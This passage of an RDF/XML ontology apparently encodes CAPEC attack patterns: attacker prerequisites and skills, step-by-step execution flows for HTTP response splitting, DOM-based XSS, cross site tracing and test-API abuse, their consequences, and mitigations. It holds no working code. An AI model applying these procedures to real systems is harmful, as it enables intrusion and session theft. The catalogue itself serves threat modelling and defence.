            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Web Application Fingerprinting"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::497::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Request fingerprinting) Use automated tools or send web server specific commands to web server and wait for server&apos;s response.TECHNIQUE:Use automated tools or send web server specific commands to web server and then receive server&apos;s response.::STEP:2:PHASE:Experiment:DESCRIPTION:(Increase the accuracy of server fingerprinting of Web servers) Attacker usually needs to send several different commands to accurately identify the web server. Attacker can also use automated tools to send requests to the server. The responses of the server may be different in terms of protocol behavior.TECHNIQUE:Observe the ordering of the several HTTP response headers. The ordering of the header of each server may have unique identities.:TECHNIQUE:Send bad requests or requests of nonexistent pages to the server.:TECHNIQUE:Attacker takes existing automated tools to recognize the type and the version of the web server in use.::STEP:3:PHASE:Experiment:DESCRIPTION:(Identify Web Application Software) After the web server platform software has been identified  the attacker start to identify web application technologies such as ASP  .NET  PHP and Java on the server.TECHNIQUE:Examine the file name extensions in URL  for example .php indicates PHP script interfaced with Apache server.:TECHNIQUE:Examine the HTTP Response Headers. This may leak information about software signatures:TECHNIQUE:Examine Cookies that may contain server&apos;s software information.:TECHNIQUE:Check error pages.::STEP:4:PHASE:Experiment:DESCRIPTION:(Identify Backend Database Version) Determining the database engine type can assist attackers&apos; attempt to successfully execute SQL injection. Some database API such as ODBC will show a database type as part of the driver information when reporting an error.TECHNIQUE:Use tools to send bogus SQL query to the server and check error pages.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Other:NOTE:Confidentiality Other Information Leakage::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker166">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#298"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack166"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary requires the ability to send a UDP datagram to a remote host and receive a response.::The adversary requires the ability to craft custom UDP Packets for use during network reconnaissance.::The target&apos;s firewall must not be configured to block egress ICMP messages.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::UDP pings can be performed via the use of a port scanner or by raw socket manipulation using a scripting or programming language. Packet injection tools are also useful for this purpose. Depending upon the technique used it may also be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Design: Do not program input values directly on command shell  instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values  stripping or filtering out all unauthorized commands and characters in the process.::Design: Limit program privileges  so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in  making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.::Implementation: Implement an audit log that is written to a separate host  in the event of a compromise the audit log may be able to provide evidence and details of the compromise.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack232"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker299">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#134"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack299"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::150::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The target application must allow the user to send email to some recipient  to specify the content at least one header field in the message  and must fail to sanitize against the injection of command separators.::The adversary must have the ability to access the target mail application.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker210">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#44"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack210"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::120::119::697::713::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Target software processes binary resource files.::Target software contains a buffer overflow vulnerability reachable through input from a user-controllable binary resource file.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:To modify file  deceive client into downloading  locate and exploit remote stack or heap vulnerability:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker343">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#185"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack343"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::494::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker476">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#34">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:220::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#HTTP Response Splitting"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack476">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#34"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::113::697::707::713::74::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Spider) Using a browser or an automated tool  an adversary follows all public links on a web site. He records all the links  the forms and all potential user-controllable input points for the web application.TECHNIQUE:Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL  forms found in the pages (like file upload  etc.).:TECHNIQUE:Use a proxy tool to record all links visited during a manual traversal of the web application.:TECHNIQUE:Use a browser to manually explore the website and analyze how it is constructed. Many browsers&apos; plugins are available to facilitate the analysis or automate the discovery.::STEP:2:PHASE:Experiment:DESCRIPTION:(Attempt variations on input parameters) The adversary injects the entry points identified in the Explore Phase with response splitting syntax and variations of payloads to be acted on in the additional response. He records all the responses from the server that include unmodified versions of his payload.TECHNIQUE:Use CRLF characters (encoded or not) in the payloads in order to see if the HTTP header can be split.:TECHNIQUE:Use a proxy tool to record the HTTP responses headers.::STEP:3:PHASE:Exploit:DESCRIPTION:(Cross-Site Scripting) As the adversary succeeds in exploiting the vulnerability  they can choose to attack the user with Cross-Site Scripting. The possible outcomes of such an attack are described in the Cross-Site Scripting related attack patterns.TECHNIQUE:Inject cross-site scripting payload preceded by response splitting syntax (CR/LF) into user-controllable input identified as vulnerable in the Experiment Phase.::STEP:4:PHASE:Exploit:DESCRIPTION:(Cache poisoning) The adversary decides to target the cache server by forging new responses. The server will then cache the second request and response. The cached response has most likely an attack vector like Cross-Site Scripting; this attack will then be serve to many clients due to the caching system.TECHNIQUE:The adversary decides to target the cache server by forging new responses. The server will then cache the second request and response. The cached response has most likely an attack vector like Cross-Site Scripting; this attack will then be serve to many clients due to the caching system.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::113::697::707::713::74::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::User-controlled input used as part of HTTP header::Ability of adversary to inject custom strings in HTTP header::Insufficient input validation in application to check for input sanity before using it as part of response header::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The adversary needs to have a solid understanding of the HTTP protocol and HTTP headers and must be able to craft and inject requests to elicit the split responses.:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::None: No specialized resources are required to execute this type of attack.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Cloud providers should completely delete data to render it irrecoverable and inaccessible from any layer and component of infrastructure resources.::Deletion of data should be completed promptly when requested.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack151"/>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Use browser technologies that do not allow client-side scripting.::Utilize proper character encoding for all output produced within client-site scripts manipulating the DOM.::Ensure that all user-supplied input is validated before use.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack500">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#588">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:63::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Stable"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#DOM-Based XSS"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::79::20::83::"/>
        </j.0:exploits>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data:NOTE:Confidentiality Read Data A successful DOM-based XSS attack can enable an adversary to exfiltrate sensitive information from the application.::SCOPE:Confidentiality:SCOPE:Authorization:SCOPE:Access ControlTECHNICAL IMPACT:Gain Privileges:NOTE:Confidentiality Authorization Access Control Gain Privileges A successful DOM-based XSS attack can enable an adversary to elevate their privilege level and access functionality they should not otherwise be allowed to access.::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands A successful DOM-based XSS attack can enable an adversary run arbitrary code of their choosing  thus enabling a complete compromise of the application.::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data:NOTE:Integrity Modify Data A successful DOM-based XSS attack can allow an adversary to tamper with application data.::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Application Architects must be careful to design callback  signal  and similar asynchronous constructs such that they shed excess privilege prior to handing control to user-written (thus untrusted) code.::Application Architects must be careful to design privileged code blocks such that upon return (successful  failed  or unpredicted) that privilege is shed prior to leaving the block/scope.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack363"/>
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack6"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker342">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#186"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack342"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::494::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This attack requires advanced cyber capabilities:LEVEL:High::"/>
    </j.0:need>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::Manual or user-assisted attacks require deceptive mechanisms to trick the user into clicking a link or downloading and installing software. Automated update attacks require the attacker to host a payload and then trigger the installation of the payload code.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker475">
    <j.0:relatedTo>
      <j.0:Id rdf:about="http://krstProj.com/capec#77">
        <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:22::"/>
        <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#High"/>
        <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
        <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
        <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
        <j.0:hasName>
          <j.0:Name rdf:about="http://krstProj.com/capec#Manipulating User-Controlled Variables"/>
        </j.0:hasName>
      </j.0:Id>
    </j.0:relatedTo>
    <j.0:makes>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack475">
        <j.0:relatedTo rdf:resource="http://krstProj.com/capec#77"/>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::473::15::285::302::94::96::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:The attacker communicates with the application server using a thin client (browser) or thick client.::STEP:2:PHASE:Experiment:DESCRIPTION:While communicating with the server  the attacker finds that she can control and override a variable consumed by the application server.::STEP:3:PHASE:Exploit:DESCRIPTION:The attacker overrides the variable and influences the normal behavior of the application server.::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::SCOPE:Confidentiality:SCOPE:Integrity:SCOPE:AvailabilityTECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Confidentiality Integrity Availability Execute Unauthorized Commands Run Arbitrary Code::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:makes>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::473::15::285::302::94::96::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A variable consumed by the application server is exposed to the client.::A variable consumed by the application server can be overwritten by the user.::The application server trusts user supplied data to compute business logic.::The application server does not perform proper input validation.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The malicious user can easily try some well-known global variables and find one which matches.:LEVEL:Low::SKILL:The attacker can use automated tools to probe for variables that she can control.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Administrators should disable support for HTTP TRACE at the destination&apos;s web server. Vendors should disable TRACE by default.::Patch web browser against known security origin policy bypass exploits.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack371">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#107">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:593::NATURE:CanFollow:CAPEC ID:63::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Medium"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#Very High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Detailed"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Cross Site Tracing"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::693::648::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine if HTTP Trace is enabled) Determine if HTTP Trace is enabled at the web server with which the victim has a an active sessionTECHNIQUE:An adversary may issue an HTTP Trace request to the target web server and observe if the response arrives with the original request in the body of the response.::STEP:2:PHASE:Experiment:DESCRIPTION:(Identify mechanism to launch HTTP Trace request) The adversary attempts to force the victim to issue an HTTP Trace request to the targeted application.TECHNIQUE:The adversary probes for cross-site scripting vulnerabilities to force the victim into issuing an HTTP Trace request.::STEP:3:PHASE:Exploit:DESCRIPTION:(Create a malicious script that pings the web server with HTTP TRACE request) Create a malicious script that will induce the victim&apos;s browser to issue an HTTP TRACE request to the destination system&apos;s web server. The script will further intercept the response from the web server  pick up sensitive information out of it  and forward to the site controlled by the adversary.TECHNIQUE:The adversary&apos;s malicious script circumvents the httpOnly cookie attribute that prevents from hijacking the victim&apos;s session cookie directly using document.cookie and instead leverages the HTTP TRACE to catch this information from the header of the HTTP request once it is echoed back from the web server in the body of the HTTP TRACE response.::STEP:4:PHASE:Exploit:DESCRIPTION:(Execute malicious HTTP Trace launching script) The adversary leverages a vulnerability to force the victim to execute the malicious HTTP Trace launching script::"/>
        </j.0:executes>
        <j.0:implies>
          <j.0:Consequence rdf:about="http://krstProj.com/capec#::SCOPE:ConfidentialityTECHNICAL IMPACT:Read Data::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:AuthorizationTECHNICAL IMPACT:Gain Privileges::SCOPE:IntegrityTECHNICAL IMPACT:Modify Data::"/>
        </j.0:implies>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker341">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#511"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack341"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).::The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.::The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#::SKILL:Intelligence about the manufacturer&apos;s operating environment and infrastructure.:LEVEL:Medium::SKILL:Ability to develop  deploy  and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment.:LEVEL:High::SKILL:Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS  anti-virus  etc):LEVEL:High::"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker474">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#95"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack474"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::538::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::A client program connecting to a web service can read the WSDL to determine what functions are available on the server.::The target host exposes vulnerable functions within its WSDL interface.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:This attack can be as simple as reading WSDL and starting sending invalid request.:LEVEL:Low::SKILL:This attack can be used to perform more sophisticated attacks (SQL injection  etc.):LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker473">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#78"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack473"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::180::181::173::171::172::73::21::22::74::20::697::707::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The application accepts the backlash character as escape character.::The application server does incomplete input data decoding  filtering and validation.::"/>
    </j.0:precondition>
    <j.0:need>
      <j.0:Skill rdf:about="http://krstProj.com/capec#::SKILL:The attacker can naively try backslash character and discover that the target host uses it as escape character.:LEVEL:Low::SKILL:The attacker may need deep understanding of the host target in order to exploit the vulnerability. The attacker may also use automated tools to probe for this vulnerability.:LEVEL:Medium::"/>
    </j.0:need>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker340">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#394"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack340"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker293">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#384"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack293"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::471::345::346::602::311::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::Targeted software is utilizing application framework APIs::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::A software program that allows a user to man-in-the-middle communications between the client and server  such as a man-in-the-middle proxy.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker160">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#307"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack160"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::200::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::RPC scanning requires no special privileges when it is performed via a native system utility.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::The ability to craft custom RPC datagrams for use during network reconnaissance via native OS utilities or a port scanning tool. By tailoring the bytes injected one can scan for specific RPC-registered services. Depending upon the method used it may be necessary to sniff the network in order to see the response.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker292">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#389"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack292"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::353::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::Targeted software is utilizing application framework APIs::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A software program that allows a user to man-in-the-middle communications between the client and server  such as a man-in-the-middle proxy.::"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Ensure that production systems to not contain sample or test APIs and that these APIs are only used in development environments.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack248">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#121">
            <j.0:relatedPattern rdf:resource="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:113::"/>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#Low"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#High"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Exploit Test APIs"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits>
          <j.0:Vulnerability rdf:about="http://krstProj.com/capec#::489::"/>
        </j.0:exploits>
        <j.0:executes>
          <j.0:ExecutionFlow rdf:about="http://krstProj.com/capec#::STEP:1:PHASE:Explore:DESCRIPTION:(Determine Vulnerable API) An adversary explores a target system for sample or test APIs that have not been disabled by a system administrator and which may be exploitable by the adversary.TECHNIQUE:If needed  the adversary explores an organization&apos;s network to determine if any specific systems of interest exist.::STEP:2:PHASE:Exploit:DESCRIPTION:(Leverage Test API to Execute Attacks) Once an adversary has discovered a system with a sample or test API  the API is leveraged to exploit the system and/or conduct various attacks.TECHNIQUE:The adversary can leverage the sample or test API to conduct several types of attacks such as Man-in-the-Middle attacks  keylogging  Cross Site Scripting (XSS)  and more.::"/>
        </j.0:executes>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker291">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#387"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack291"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::471::345::346::602::311::"/>
    <j.0:precondition rdf:resource="http://krstProj.com/capec#::Targeted software is utilizing application framework APIs::"/>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#::A software program that allows a user to man-in-the-middle communications between the client and server  such as a man-in-the-middle proxy.::"/>
  </j.0:Attacker>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker50">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#582"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack50"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The adversary requires knowledge of and access to network route.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses rdf:resource="http://krstProj.com/capec#null"/>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Insure that binaries commonly used by the system have the correct file permissions. Set operating system policies that restrict privilege elevation of non-Administrators. Use auditing tools to observe changes to system services.::">
    <j.0:reduces rdf:resource="http://krstProj.com/capec#attack9"/>
  </j.0:MitigationAction>
  <j.0:Attacker rdf:about="http://krstProj.com/capec#attacker290">
    <j.0:relatedTo rdf:resource="http://krstProj.com/capec#226"/>
    <j.0:makes rdf:resource="http://krstProj.com/capec#attack290"/>
    <j.0:hasKnowledge rdf:resource="http://krstProj.com/capec#::565::472::"/>
    <j.0:precondition>
      <j.0:Prerequisite rdf:about="http://krstProj.com/capec#::The targeted application must use session credentials to identify legitimate users.::"/>
    </j.0:precondition>
    <j.0:need rdf:resource="http://krstProj.com/capec#null"/>
    <j.0:uses>
      <j.0:Resource rdf:about="http://krstProj.com/capec#::An attacker will need tools to sniff existing credentials (possibly their own) in order to retrieve a base credential for modification. They will need to understand how the components of the credential affect server behavior and how to manipulate this behavior by changing the credential. Finally  they will need tools to allow them to craft and transmit a modified credential.::"/>
    </j.0:uses>
  </j.0:Attacker>
  <j.0:MitigationAction rdf:about="http://krstProj.com/capec#::Minimize attacks by input validation and sanitization of any user data that will be used by the target application to locate a remote file to be included.::">
    <j.0:reduces>
      <j.0:Attack rdf:about="http://krstProj.com/capec#attack440">
        <j.0:relatedTo>
          <j.0:Id rdf:about="http://krstProj.com/capec#253">
            <j.0:relatedPattern>
              <j.0:AttackPattern rdf:about="http://krstProj.com/capec#::NATURE:ChildOf:CAPEC ID:175::"/>
            </j.0:relatedPattern>
            <j.0:hasLikelihood rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasSeverity rdf:resource="http://krstProj.com/capec#null"/>
            <j.0:hasStatus rdf:resource="http://krstProj.com/capec#Draft"/>
            <j.0:hasAbstraction rdf:resource="http://krstProj.com/capec#Standard"/>
            <j.0:hasName>
              <j.0:Name rdf:about="http://krstProj.com/capec#Remote Code Inclusion"/>
            </j.0:hasName>
          </j.0:Id>
        </j.0:relatedTo>
        <j.0:exploits rdf:resource="http://krstProj.com/capec#::829::"/>
        <j.0:executes rdf:resource="http://krstProj.com/capec#null"/>
        <j.0:implies rdf:resource="http://krstProj.com/capec#null"/>
      </j.0:Attack>
    </j.0:reduces>
  </j.0:MitigationAction>
